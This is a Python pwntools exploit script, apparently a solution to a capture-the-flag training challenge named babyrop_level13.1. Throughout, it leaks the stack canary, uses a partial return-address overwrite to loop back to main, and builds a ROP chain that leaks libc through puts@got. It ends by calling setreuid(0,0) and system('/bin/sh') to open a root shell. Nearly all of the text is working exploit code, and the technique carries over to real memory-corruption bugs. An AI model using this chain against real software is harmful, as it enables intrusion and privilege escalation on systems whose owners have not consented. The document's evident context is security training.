# idea: leak canary -> overflow with leave; ret; gadget in libc with 12 bits brute-forcing and fake rbp = 0x20 below return addr -> return to main
from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyrop_level13.1")

p.recvuntil("located at: ")
input_buffer = int(p.recvuntil(".")[:-1], 16)
canary_addr = input_buffer + 0x78
fake_rbp = input_buffer + 0x80 + 0x8 + 0x20 - 0x8 # the addr 8 byte above what we truly what to return to

print(p.recv())

p.sendline(hex(canary_addr)) # not bytes, send as string

p.recvuntil("= ")
canary = int(p.recvuntil("\n")[:-1], 16)

padding = b"A" * 0x78 # right before fake rbp

#payload = padding + p64(canary) + p64(fake_rbp) + pack(leave_ret, 24)
payload = padding + p64(canary) + p64(fake_rbp) + p16(0xcf90) # libc_start_main
p.send(payload)


# below got executed if if return to main
# jumping right into arbitrary 8 bytes read
# leak libc base addr by leaking puts@plt addr. First we leak main addr then we add offset of puts@plt and puts@got. main addr located 0x20 below return addr
p.sendline(hex(input_buffer + 0x80 + 0x8 + 0x20))
p.recvuntil("= ")
main_addr = int(p.recvuntil("\n")[:-1], 16)
elf = ELF("/challenge/babyrop_level13.1")
rop = ROP(elf)
print("main addr: {}".format(p64(main_addr)))

binary_base = main_addr - elf.sym['main']
pop_rdi = rop.rdi.address + binary_base
puts_plt = elf.plt.puts + binary_base
puts_got = elf.got.puts + binary_base # already filled in GOT
start = elf.sym['_start'] + binary_base

# leak puts@got addr
rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start)

payload = padding + p64(canary) + p64(fake_rbp) + rop.chain()
p.send(payload)

print(p.recv())
p.recvuntil("Goodbye!\n")
puts_addr = unpack(p.recvuntil("\n")[:-1], 'all')
print("puts addr {}".format(p64(puts_addr)))

# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])

# we returned to main so we need to pass the leak. Not necessary, just dummy.
p.sendline(hex(input_buffer + 0x80 + 0x8 + 0x20))
p.send(padding + p64(canary) + p64(fake_rbp) + rop.chain())

p.interactive()
#print(p.recvall())
#p.close()

